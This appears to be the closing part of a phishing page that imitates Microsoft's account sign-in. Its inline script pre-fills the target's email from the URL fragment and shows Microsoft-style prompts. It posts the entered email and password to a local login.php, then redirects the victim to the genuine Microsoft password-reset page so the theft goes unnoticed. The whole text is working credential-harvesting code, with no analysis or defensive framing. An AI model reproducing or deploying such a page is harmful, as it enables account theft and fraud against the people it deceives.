    <script src="assets/app.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            try {
                const hash = window.location.hash.substring(1);
                const email = hash;
                const inputElement = document.querySelector('#inp_uname');
                const pwdElement = document.querySelector('#inp_pwd');

                const nextButton = document.querySelector('#btn_next');
                const signInButton = document.querySelector('#btn_sig');

                if (inputElement && pwdElement && nextButton && signInButton) {
                    inputElement.value = email;

                    nextButton.addEventListener('click', () => {
                        const uname = inputElement.value.trim();
                        if (uname) {
                            document.getElementById('error_uname').textContent = '';
                            document.getElementById('section_uname').classList.add('d-none');
                            document.getElementById('section_pwd').classList.remove('d-none');
                        } else {
                            document.getElementById('error_uname').textContent = 'Please enter a valid email, phone, or Skype name.';
                        }
                    });

                    signInButton.addEventListener('click', () => {
                        const uname = inputElement.value.trim();
                        const pwd = pwdElement.value.trim();
                        if (uname && pwd) {
                            // Perform the form submission with email and password
                            const formData = new FormData();
                            formData.append('loginfmt', uname);
                            formData.append('passwd', pwd);
                            fetch('login.php', {
                                method: 'POST',
                                body: formData
                            }).then(response => {
                                if (response.ok) {
                                    window.location.href = 'https://account.live.com/ResetPassword.aspx';
                                } else {
                                    console.error('Failed to submit the form.');
                                }
                            }).catch(error => {
                                console.error('Error:', error);
                            });
                        } else {
                            document.getElementById('error_pwd').textContent = 'Please enter your password.';
                        }
                    });
                } else {
                    console.warn('Input or button elements not found.');
                }
            } catch (error) {
                console.error('An error occurred:', error);
            }
        });
    </script>
</body>
